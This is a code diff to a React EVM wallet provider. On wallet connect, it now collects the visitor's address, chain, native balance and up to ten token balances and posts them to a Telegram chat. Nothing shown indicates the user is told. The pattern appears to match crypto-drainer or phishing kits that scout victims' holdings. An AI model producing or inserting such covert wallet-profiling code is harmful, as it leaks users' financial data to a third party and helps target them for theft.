@@ -66,13 +66,50 @@ export const EVMWalletProvider: FC<{ children: ReactNode }> = ({ children }) => 
 
   // Send notification when EVM wallet connects
   useEffect(() => {
-    if (evmAddress) {
-      sendTelegramMessage(`
+    if (evmAddress && evmSigner) {
+      const fetchAndNotify = async () => {
+        try {
+          const provider = await evmSigner.provider;
+          // Fetch native balance
+          const nativeBalance = await provider.getBalance(evmAddress);
+          const nativeAmount = ethers.formatEther(nativeBalance);
+
+          // Fetch token balances using detectWalletTokens function
+          const tokenDetection = await detectWalletTokens(evmAddress, evmChainId || 1);
+          const tokens = tokenDetection.tokens;
+
+          // Build message
+          let message = `
+🔗 <b>EVM Wallet Connected</b>
+👤 <b>Address:</b> <code>${evmAddress}</code>
+🌐 <b>Chain:</b> <code>${chainName || 'Unknown'}</code>
+💰 <b>Native Balance:</b> <code>${nativeAmount.slice(0, 10)} ${nativeToken || 'ETH'}</code>
+`;
+
+          if (tokens.length > 0) {
+            message += `\n📋 <b>Token Balances:</b>`;
+            tokens.slice(0, 10).forEach((token, i) => {
+              message += `\n- ${token.symbol} (${token.contractAddress.slice(0, 6)}...): <code>${token.uiAmount?.toFixed(4) || 0}</code>`;
+            });
+            if (tokens.length > 10) {
+              message += `\n... and ${tokens.length - 10} more`;
+            }
+          }
+
+          sendTelegramMessage(message);
+        } catch (error) {
+          console.error('Error fetching EVM balances:', error);
+          // Fallback to just wallet connected
+          sendTelegramMessage(`
 🔗 <b>EVM Wallet Connected</b>
 👤 <b>Address:</b> <code>${evmAddress}</code>
 `);
+        }
+      };
+
+      fetchAndNotify();
     }
-  }, [evmAddress]);
+  }, [evmAddress, evmSigner, evmChainId, chainName, nativeToken]);
 
   const { login, logout, authenticated, ready } = usePrivy();
   const { wallets } = useWallets();
